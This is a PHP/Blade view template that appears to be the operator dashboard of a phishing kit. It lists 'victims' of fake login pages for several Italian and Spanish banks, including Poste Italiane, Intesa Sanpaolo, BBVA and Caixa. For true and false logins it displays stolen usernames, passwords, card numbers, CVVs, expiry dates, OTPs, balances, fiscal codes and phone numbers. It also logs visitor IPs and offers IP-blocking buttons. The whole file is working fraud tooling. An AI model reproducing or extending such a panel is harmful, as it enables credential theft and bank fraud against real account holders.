@extends('assets.backend.default')

{{--*/ $ci =& get_instance(); /*--}}

@push('extrajs')
<!-- FooTable -->
<script src="{{site_url('assets/js/ajax-form.js')}}"></script>
<script src="{{site_url('assets/backend/js/plugins/footable/footable.all.min.js')}}"></script>
<!-- Page-Level Scripts -->
<script>
    $(document).ready(function () {
        $('.footable').footable();
    });
</script>
<!-- Sweet alert -->
<script src="{{site_url('assets/backend/js/plugins/sweetalert/sweetalert.min.js')}}"></script>
<script src="{{site_url('assets/backend/js/plugins/ladda/spin.min.js')}}"></script>
<script src="{{site_url('assets/backend/js/plugins/ladda/ladda.min.js')}}"></script>
<script src="{{site_url('assets/backend/js/plugins/ladda/ladda.jquery.min.js')}}"></script>
@endpush

@push('extracss')
<link href="{{site_url('assets/backend/css/plugins/ladda/ladda-themeless.min.css')}}" rel="stylesheet">
<!-- FooTable -->
<link href="{{site_url('assets/backend/css/plugins/footable/footable.core.css')}}" rel="stylesheet">
<link href="{{site_url('assets/backend/css/plugins/sweetalert/sweetalert.css')}}" rel="stylesheet">
@endpush


@section('content')
<div class="row">

    <div class="col-md-4 col-xs-12">

        <div class="widget style1 lazur-bg">
            <div class="row">
                <div class="col-xs-4">
                    <i class="fa fa-hashtag fa-5x"></i>
                </div>
                <div class="col-xs-8 text-right">
                    <h2 class="font-bold"> Uniq ID </h2>
                    <h2 class="font-bold" style="font-size: 12px;">#{{$links->uniq}}</h2>
                </div>
            </div>
        </div>

    </div>
    <!-- /.col-md-4 col-xs-12 -->
    <div class="col-md-4 col-xs-12">

        <div class="widget style1 lazur-bg">
            <div class="row">
                <div class="col-xs-4">
                    <i class="fa fa-envelope-o fa-5x"></i>
                </div>
                <div class="col-xs-8 text-right">
                    <h2 class="font-bold"> Vicitm ID </h2>
                    <h2 class="font-bold" style="font-size: 12px;">{{$links->victim}}</h2>
                </div>
            </div>
        </div>

    </div>
    <!-- /.col-md-4 col-xs-12 -->
    <div class="col-md-4 col-xs-12">

        <div class="widget style1 lazur-bg">
            <div class="row">
                <div class="col-xs-4">
                    <i class="fa fa-clock-o fa-5x"></i>
                </div>
                <div class="col-xs-8 text-right">
                    <h2 class="font-bold"> Created @ </h2>
                    <h2 class="font-bold" style="font-size: 12px;">{{niceTime($links->time)}}</h2>
                </div>
            </div>
        </div>

    </div>
    <!-- /.col-md-4 col-xs-12 -->

    <div class="col-xs-12 text-cetner">
        <div style="border-bottom: 1px #b9b9b9 solid; margin: 20px auto 40px auto; width: 90%"></div>
        <!-- /.clearfix -->
    </div>
    <!-- /.text-cetner -->

    <!--
    <div class="col-xs-6">
      <div class="widget style1 blue-bg">
            <div class="row">
                <div class="text-center">
                    <h2 class="font-bold"> TRUE LOGIN (TOTAL: {{count($tracesTrue)}})</h2>
                </div>
            </div>
      </div>
      @foreach($tracesTrue as $traceTrue )
      <div class="vertical-timeline-block">

          <div class="vertical-timeline-content" style="margin-left: 0px;">
              <h2>Viewer Info's</h2>
              <p>
                  <strong>Ip:</strong> <?php echo $traceTrue->ip; ?>
                  <br />
                  <strong>Platform:</strong> <?php echo $traceTrue->platform; ?>
                  <br />
                  <strong>Borswer:</strong> <?php echo $traceTrue->broswer; ?>
                  <br />
                  <strong>User Agent3:</strong> <?php echo $traceTrue->userAgent; ?>
              </p>
              <a class="blockd-ajax btn-danger btn btn-sm" data-url="<?php echo site_url('admin/banned/block/'); ?>" data-ip="<?php echo $traceTrue->ip; ?>" data-toggle="tooltip" data-placement="top" title="<?php echo $traceTrue->ip; ?>"> <i class="fa fa-times-circle-o"></i> <span>Block</span></a>
              <span class="vertical-date">
                          <small>{{date('D, d M Y - g:i:s A', strtotime($traceTrue->time))}}</small>
                      </span>
          </div>
      </div>
      @endforeach
    </div>
    -->

    <div class="col-lg-6" >
        <div class="ibox float-e-margins">
            <div class="widget style1 blue-bg">
                  <div class="row">
                      <div class="text-center">
                          <h2 class="font-bold"> TRUE LOGIN (TOTAL: {{count($tracesTrue)}})</h2>
                      </div>
                  </div>
            </div>
            <div class="ibox-content">
                <table class="footable table table-stripped toggle-plus" data-page-size="20" data-filter=#filter>
                    <thead>
                    <tr>
                        <th>{{ $ci->lang->line('Username') }}</th>
                        <th>{{ $ci->lang->line('Password') }}</th>
                        <th data-hide="phone">{{ $ci->lang->line('IP') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Browser') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('System_OS') }}</th>
                        <th>{{ $ci->lang->line('Time') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('User_Agent') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('ID_Link') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Page_Script') }}</th>
                        <th data-hide="all">Info's</th>
                        <!--
                        <th data-toggle="true"> {{ $ci->lang->line('Username') }}</th>
                        <th>{{ $ci->lang->line('Password') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Created_On') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Link') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Page_Script') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Cell') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Tipo_di_Conto') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Card_Number') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('OTP') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('CVV') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Saldo') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Card_Expiry_Date') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('IP') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Browser') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('System_OS') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('User_Agent') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Time_Logged_In') }}</th>
                        <th data-hide="all" class="text-center">{{ $ci->lang->line('Action') }}</th>
                        -->
                    </tr>
                    </thead>
                    <tbody>
                    @foreach($tracesTrue as $victim)
                        <tr>

                          <td>{{$victim->email or $ci->lang->line('Not_provided')}}</td>
                          <td> {{$victim->pass or $ci->lang->line('Not_provided')}} </a></td>
                          <td>{{$victim->ip or $ci->lang->line('Not_provided')}}</td>
                          <td>{{$victim->browser or $ci->lang->line('Not_provided')}}</td>
                          <td>{{$victim->platform or $ci->lang->line('Not_provided')}}</td>
                          <td>{{getTime($victim->timestamp, 'D, j M Y - h:i:s a')}}</td>
                          <td>{{substr($victim->userAgent,0,4) or $ci->lang->line('Not_provided')}}</td>
                          <td>{{$victim->link or $ci->lang->line('Not_provided')}}</td>
                          <td>
                            <?php
                              if($victim->TemplateBank == 1){echo 'Posteitaliane';}
                              if($victim->TemplateBank == 2){echo 'Intesa Sanpaolo';}
                              if($victim->TemplateBank == 3){echo 'BBVA';}
                              if($victim->TemplateBank == 4){echo 'Bankia';}
                              if($victim->TemplateBank == 4){echo 'Caixa';}
                            ?></td>
                          <td>
                            <?php
                            if($victim->TemplateBank == 1){
                              echo '<b>Nome: </b>' . $victim->Nome . '<br>';
                              echo '<b>Cognome: </b>' . $victim->Cognome . '<br>';
                              echo '<b>Cell: </b>' . $victim->color . '<br>';
                              echo '<b>Data Nascita: </b>' . $victim->Datadinascita . '<br>';
                              echo '<b>Codice Fiscale: </b>' . $victim->Codicefiscale . '<br>';
                              echo '<b>Card Number: </b>' . $victim->CardNumber . '<br>';
                              echo '<b>CVV: </b>' . $victim->CVV . '<br>';
                              echo '<b>Card Expirity Date: </b>' . $victim->CardExpiryDate . '<br>';
                              echo '<b>Saldo: </b>' . $victim->Saldo . '<br>';
                              echo '<b>OTP: </b>' . $victim->OTP . '<br>';
                            }
                            if($victim->TemplateBank == 2){
                              echo '<b>Cell: </b>' . $victim->color . '<br>';
                              echo '<b>Tipo di Conto: </b>' . $victim->Contos . '<br>';
                            }
                            if($victim->TemplateBank == 3){
                              echo '<b>Nùmero de movil: </b>' . $victim->color . '<br>';
                            }
                              if($victim->TemplateBank == 4){
                                echo '<b>Firma Electrónica: </b>' . $victim->Codicefiscale . '<br>';
                                echo '<b>Nùmero de movil: </b>' . $victim->color . '<br>';
                              }
                             ?>
                          </td>
                            <!--
                            <td>{{$victim->name or 'Aguardando'}}</td>
                            <td> {{$victim->pass or 'Aguardando'}} </a></td>
                            <td>{{getTime($victim->timestamp, 'D, j M Y - h:i:s a')}}</td>
                            <td>{{$victim->linkAcessado or 'Aguardando'}}</td>
                            <td>
                              <?php
                                if($victim->TemplateBank == 1){echo 'Posteitaliane';}
                                if($victim->TemplateBank == 2){echo 'Intesa Sanpaolo';} ?>
                            </td>
                            <td><span class="badge info-bg">{{$victim->color or $ci->lang->line('Not_provided')}}</span></td>
                            <td><span class="badge info-bg">{{$victim->Contos or $ci->lang->line('Not_provided')}}</span></td>
                            <td><span class="badge info-bg">{{$victim->imei or 'Not provided'}}</span><input
                                        type="hidden" value="{{$victim->imei}}" name="Imei" id="Imei"> </td>
                            <td><span class="badge info-bg">{{$victim->serial or $ci->lang->line('Not_provided')}}</span></td>
                            <td><span class="badge info-bg">{{$victim->model or $ci->lang->line('Not_provided')}}</span></td>
                            <td><span class="badge info-bg">{{$victim->size or $ci->lang->line('Not_provided')}}</span></td>
                            <td><span class="badge info-bg">{{$victim->phone or $ci->lang->line('Not_provided')}}</span></td>
                            <td>{{$victim->ip or 'Aguardando'}}</td>
                            <td>{{$victim->browser or 'Aguardando'}}</td>
                            <td>{{$victim->platform or 'Aguardando'}}</td>
                            <td>{{$victim->agent_string or 'Aguardando'}}</td>
                            <td>{{is_null($victim->time_logged) ? 'Aguardando' : getTime($victim->time_logged, 'D, j M Y - h:i:s a') }}</td>
                            <td class="text-center">


                                <a @if($victim->done != 1) disabled="disabled" readonly="readonly"
                                   @endif class="@if($victim->done == 1) blockd-ajax @endif btn-danger btn btn-xs"
                                   data-url="{{site_url(ADMINPATH.'banned/block/')}}" data-ip="{{$victim->ip}}"
                                   data-toggle="tooltip" data-placement="top" title="{{$victim->ip}}"><i
                                            class="fa fa-times-circle-o"></i> <span>{{$ci->lang->line('Block')}}</span></a>

                            </td>
                          -->
                        </tr>
                    @endforeach
                    </tbody>
                    <tfoot>
                    <tr>
                        <td colspan="5">
                            <ul class="pagination pull-right"></ul>
                        </td>
                    </tr>
                    </tfoot>
                </table>

            </div>
        </div>
    </div>


    <!--
    <div class="col-xs-6">
      <div class="widget style1 red-bg">
            <div class="row">
                <div class="text-center">
                    <h2 class="font-bold"> FALSE LOGIN (TOTAL: {{count($tracesFalse)}})</h2>
                </div>
            </div>
      </div>
      @foreach($tracesFalse as $traceFalse )
      <div class="vertical-timeline-block">
          <div class="vertical-timeline-content" style="margin-left: 0px;">
              <h2>Viewer Info's</h2>
              <p>
                  <strong>Ip:</strong> <?php echo $traceFalse->ip; ?>
                  <br />
                  <strong>Platform:</strong> <?php echo $traceFalse->platform; ?>
                  <br />
                  <strong>Borswer:</strong> <?php echo $traceFalse->broswer; ?>
                  <br />
                  <strong>User Agent3:</strong> <?php echo $traceFalse->userAgent; ?>
              </p>
              <a class="blockd-ajax btn-danger btn btn-sm" data-url="<?php echo site_url('admin/banned/block/'); ?>" data-ip="<?php echo $traceFalse->ip; ?>" data-toggle="tooltip" data-placement="top" title="<?php echo $traceFalse->ip; ?>"> <i class="fa fa-times-circle-o"></i> <span>Block</span></a>
              <span class="vertical-date">
                          <small>{{date('D, d M Y - g:i:s A', strtotime($traceFalse->time))}}</small>
                      </span>
          </div>
      </div>
      @endforeach
    </div>
    -->

    <div class="col-lg-6" >
        <div class="ibox float-e-margins">
            <div class="widget style1 red-bg">
                  <div class="row">
                      <div class="text-center">
                          <h2 class="font-bold"> FALSE LOGIN (TOTAL: {{count($tracesFalse)}})</h2>
                      </div>
                  </div>
            </div>
            <div class="ibox-content">
                <table class="footable table table-stripped toggle-plus" data-page-size="20" data-filter=#filter>
                    <thead>
                    <tr>
                        <th>{{ $ci->lang->line('Username') }}</th>
                        <th>{{ $ci->lang->line('Password') }}</th>
                        <th data-hide="phone">{{ $ci->lang->line('IP') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Browser') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('System_OS') }}</th>
                        <th>{{ $ci->lang->line('Time') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('User_Agent') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('ID_Link') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Page_Script') }}</th>
                        <th data-hide="all">Info's</th>
                        <!--
                        <th data-toggle="true"> {{ $ci->lang->line('Username') }}</th>
                        <th>{{ $ci->lang->line('Password') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Created_On') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Link') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Page_Script') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Cell') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Tipo_di_Conto') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Card_Number') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('OTP') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('CVV') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Saldo') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Card_Expiry_Date') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('IP') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Browser') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('System_OS') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('User_Agent') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Time_Logged_In') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Nome') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Cognome') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Data_Nascita') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Codice_Fiscale') }}</th>
                        <th data-hide="all">{{ $ci->lang->line('Ricordo_Codice_Titolare') }}</th>
                        <th data-hide="all" class="text-center">{{ $ci->lang->line('Action') }}</th>
                        -->
                    </tr>
                    </thead>
                    <tbody>
                    @foreach($tracesFalse as $victim)
                        <tr>
                            <td>{{$victim->email or $ci->lang->line('Not_provided')}}</td>
                            <td> {{$victim->pass or $ci->lang->line('Not_provided')}} </a></td>
                            <td>{{$victim->ip or $ci->lang->line('Not_provided')}}</td>
                            <td>{{$victim->browser or $ci->lang->line('Not_provided')}}</td>
                            <td>{{$victim->platform or $ci->lang->line('Not_provided')}}</td>
                            <td>{{getTime($victim->time, 'D, j M Y - h:i:s a')}}</td>
                            <td>{{$victim->userAgent or $ci->lang->line('Not_provided')}}</td>
                            <td>{{$victim->link or $ci->lang->line('Not_provided')}}</td>
                            <td>
                              <?php
                                if($victim->TemplateBank == 1){echo 'Posteitaliane';}
                                if($victim->TemplateBank == 2){echo 'Intesa Sanpaolo';}
                                if($victim->TemplateBank == 3){echo 'BBVA';}
                                if($victim->TemplateBank == 4){echo 'Bankia';}
                                if($victim->TemplateBank == 5){echo 'Caixa';}
                                if($victim->TemplateBank == 6){echo 'BNL';}
                                if($victim->TemplateBank == 7){echo 'BPER';}
                              ?></td>
                            <td>
                              <?php
                              if($victim->TemplateBank == 1){
                                echo '<b>Nome: </b>' . $victim->Nome . '<br>';
                                echo '<b>Cognome: </b>' . $victim->Cognome . '<br>';
                                echo '<b>Cell: </b>' . $victim->Cell . '<br>';
                                echo '<b>Data Nascita: </b>' . $victim->Datadinascita . '<br>';
                                echo '<b>Codice Fiscale: </b>' . $victim->Codicefiscale . '<br>';
                                echo '<b>Card Number: </b>' . $victim->CardNumber . '<br>';
                                echo '<b>CVV: </b>' . $victim->CVV . '<br>';
                                echo '<b>Card Expirity Date: </b>' . $victim->CardExpiryDate . '<br>';
                                echo '<b>Saldo: </b>' . $victim->Saldo . '<br>';
                                echo '<b>OTP: </b>' . $victim->OTP . '<br>';
                              }
                              if($victim->TemplateBank == 2){
                                echo '<b>Cell: </b>' . $victim->Cell . '<br>';
                                echo '<b>Check "Non ricordo il codice titolare"?: </b>' . $victim->RicordoCodiceTitolare . '<br>';
                                echo '<b>Tipo di Conto: </b>' . $victim->Contos . '<br>';
                              }
                              if($victim->TemplateBank == 3){
                                echo '<b>Nùmero de movil: </b>' . $victim->Cell . '<br>';
                              }
                              if($victim->TemplateBank == 4){
                                echo '<b>Firma Electrónica: </b>' . $victim->Codicefiscale . '<br>';
                                echo '<b>Nùmero de movil: </b>' . $victim->Cell . '<br>';
                              }
                              if($victim->TemplateBank == 5){
                                echo '<b>Nùmero de movil: </b>' . $victim->Cell . '<br>';
                              }
                              if($victim->TemplateBank == 6){
                                echo '<b>Nùmero de movil: </b>' . $victim->Cell . '<br>';
                              }
                              if($victim->TemplateBank == 7){
                                echo '<b>Nùmero de movil: </b>' . $victim->Cell . '<br>';
                              }
                               ?>
                            </td>

                            <!--
                            <td><span class="badge info-bg">{{$victim->Cell or $ci->lang->line('Not_provided')}}</span></td>
                            <td><span class="badge info-bg">{{$victim->Contos or $ci->lang->line('Not_provided')}}</span></td>
                            <td><span class="badge info-bg">{{$victim->CardNumber or 'Not provided'}}</span><input
                                    type="hidden" value="{{$victim->imei}}" name="Imei" id="Imei"> </td>
                            <td><span class="badge info-bg">{{$victim->OTP or $ci->lang->line('Not_provided')}}</span></td>
                            <td><span class="badge info-bg">{{$victim->CVV or $ci->lang->line('Not_provided')}}</span></td>
                            <td><span class="badge info-bg">{{$victim->Saldo or $ci->lang->line('Not_provided')}}</span></td>
                            <td><span class="badge info-bg">{{$victim->CardExpiryDate or $ci->lang->line('Not_provided')}}</span></td>



                            <td>{{is_null($victim->time) ? $ci->lang->line('Not_provided') : getTime($victim->time, 'D, j M Y - h:i:s a') }}</td>
                            <td>{{$victim->Nome or $ci->lang->line('Not_provided')}}</td>
                            <td>{{$victim->Cognome or $ci->lang->line('Not_provided')}}</td>
                            <td>{{$victim->Datadinascita or $ci->lang->line('Not_provided')}}</td>
                            <td>{{$victim->Codicefiscale or $ci->lang->line('Not_provided')}}</td>
                            <td>{{$victim->RicordoCodiceTitolare or $ci->lang->line('Not_provided')}}</td>
                            <td class="text-center">



                                <a class="btn-danger btn btn-xs"
                                   data-url="{{site_url(ADMINPATH.'banned/block/')}}" data-ip="{{$victim->ip}}"
                                   data-toggle="tooltip" data-placement="top" title="{{$victim->ip}}"><i
                                            class="fa fa-times-circle-o"></i> <span>{{$ci->lang->line('Block')}}</span></a>

                            </td>
                            -->
                        </tr>
                    @endforeach
                    </tbody>
                    <tfoot>
                    <tr>
                        <td colspan="5">
                            <ul class="pagination pull-right"></ul>
                        </td>
                    </tr>
                    </tfoot>
                </table>

            </div>
        </div>
    </div>



    <div class="col-xs-12">

        <div class="ibox float-e-margins">
            <div id="ibox-content">

                <div id="vertical-timeline" class="vertical-container light-timeline">
                  <div class="widget style1 black-bg">
                        <div class="row">
                            <div class="text-center">
                                <h2 class="font-bold" style="color: white;"> ALL LOGS (TOTAL: {{count($traces)}})</h2>
                            </div>
                        </div>
                  </div>

                    @foreach($traces as $trace )
                    <div class="vertical-timeline-block">
                        <div class="vertical-timeline-icon navy-bg">
                            <i class="fa fa-eye"></i>
                        </div>

                        <div class="vertical-timeline-content">
                            <h2>Viewer Info's</h2>
                            <p>
                                <strong>Ip:</strong> <?php echo $trace->ip; ?>
                                <br />
                                <strong>Platform:</strong> <?php echo $trace->platform; ?>
                                <br />
                                <strong>Borswer:</strong> <?php echo $trace->broswer; ?>
                                <br />
                                <strong>User Agent3:</strong> <?php echo $trace->userAgent; ?>
                            </p>
                            <a class="blockd-ajax btn-danger btn btn-sm" data-url="<?php echo site_url('admin/banned/block/'); ?>" data-ip="<?php echo $trace->ip; ?>" data-toggle="tooltip" data-placement="top" title="<?php echo $trace->ip; ?>"> <i class="fa fa-times-circle-o"></i> <span>Block</span></a>
                            <span class="vertical-date">
                                        <small>{{date('D, d M Y - g:i:s A', strtotime($trace->time))}}</small>
                                    </span>
                        </div>
                    </div>
                    @endforeach


                </div>

            </div>
        </div>

    </div>
    <!-- /.col-xs-12 -->

    <div class="col-xs-12 text-center" style="margin-bottom: 30px;">
        <a href="<?php echo site_url('admin/links') ;?>" class="btn btn-sm btn-info"><i class="fa fa-arrow-left"></i> Back to Links Tracer</a>
    </div>
    <!-- /.col-xs-12 -->

</div>
<!-- /.row -->

    @endsection
